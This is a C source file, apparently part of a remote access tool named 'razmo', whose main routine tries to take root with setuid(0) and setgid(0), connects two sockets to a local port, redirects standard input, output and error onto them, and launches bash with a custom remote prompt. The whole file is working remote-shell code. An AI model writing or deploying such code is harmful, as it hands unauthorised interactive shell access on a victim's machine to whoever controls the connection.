/***************************************************************************************/
/*       ,--,                                                                          */
/*    ,---.'|                                                                          */
/*    |   | :                        ,-.----.                  ___                     */
/*    :   : |                        \    /  \               ,--.'|_                   */
/*    |   ' :                        ;   :    \              |  | :,'        ,----,    */
/*    ;   ; '              .--.--.   |   | .\ :              :  : ' :      .'   .`|    */
/*    '   | |__   ,---.   /  /    '  .   : |: |   ,--.--.  .;__,'  /    .'   .'  .'    */
/*    |   | :.'| /     \ |  :  /`./  |   |  \ :  /       \ |  |   |   ,---, '   ./     */
/*    '   :    ;/    /  ||  :  ;_    |   : .  / .--.  .-. |:__,'| :   ;   | .'  /      */
/*    |   |  ./.    ' / | \  \    `. ;   | |  \  \__\/: . .  '  : |__ `---' /  ;--,    */
/*    ;   : ;  '   ;   /|  `----.   \|   | ;\  \ ," .--.; |  |  | '.'|  /  /  / .`|    */
/*    |   ,/   '   |  / | /  /`--'  /:   ' | \.'/  /  ,.  |  ;  :    ;./__;     .'     */
/*    '---'    |   :    |'--'.     / :   : :-' ;  :   .'   \ |  ,   / ;   |  .'        */
/*              \   \  /   `--'---'  |   |.'   |  ,     .-./  ---`-'  `---'            */
/*               `----'              `---'      `--`---'                               */
/***************************************************************************************/

# include "razmo.h"

void	vclose(char* msg, unsigned int n, ...)
{
	va_list	v;
	va_start(v, n);
	for (unsigned int i = 0 ; i < n ; ++i)
		close(va_arg(v, int));
	va_end(v);
	write(STDOUT_FILENO, msg, strlen(msg));
	write(STDOUT_FILENO, "\n", 1);
	exit(1);
}

int	main(int ac, char** av)
{
	(void)ac;
	setgid(0);
	setuid(0);

	struct sockaddr_in	addr;
	s_ratz	ratz;

	if (inet_pton(AF_INET, LOCALHOST, &addr.sin_addr) <= 0)
		return (1);
	if ((ratz.whip_in = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		return (1);
	if ((ratz.whip_out = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		vclose("socket out", 1, ratz.whip_in);
	//char _true = 1;
	//setsockopt(ratz.whip, SOL_SOCKET, SO_KEEPALIVE, &_true, sizeof(_true));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(atoi(av[1]));

	if (connect(ratz.whip_in, (const struct sockaddr*)&addr, sizeof(addr)) == -1)
		vclose("connect in", 2, ratz.whip_in, ratz.whip_out);
	if (connect(ratz.whip_out, (const struct sockaddr*)&addr, sizeof(addr)) == -1)
		vclose("connect out", 2, ratz.whip_in, ratz.whip_out);

	if ((ratz.master = posix_openpt(O_RDWR | O_NOCTTY)) == -1)
		return (1);
	else if (grantpt(ratz.master) == -1 || unlockpt(ratz.master) == -1)
		vclose("grantpt", 3, ratz.master, ratz.whip_in, ratz.whip_out);
	int	chd = fork();
	if (chd == -1)
		vclose("fork", 3, ratz.master, ratz.whip_in, ratz.whip_out);
	if (chd == 0)
	{
		if ((ratz.slave = open(ptsname(ratz.master), O_RDWR)) == -1)
			vclose("open/ptsname", 3, ratz.master, ratz.whip_in, ratz.whip_out);

		dup2(ratz.whip_in, STDIN_FILENO);
		dup2(ratz.whip_out, STDOUT_FILENO);
		dup2(ratz.whip_out, STDERR_FILENO);
		close(ratz.whip_in);
		close(ratz.whip_out);
		setenv("TERM", "dumb", 1); // xterm-256color
		setenv("PS1", REMOTE_PROMPT, 1);
		if (execlp("bash", "bash", "--noprofile", "--norc", NULL) == -1)
			vclose("execpl", 4, ratz.master, ratz.slave, ratz.whip_out, ratz.whip_in);
	}
	else
		while (waitpid(chd, NULL, 0) == 0)
			sleep(1); // usleep(10) pref
	close(ratz.master);
	close(ratz.slave);
	close(ratz.whip_in);
	close(ratz.whip_out);
	return (0);
}
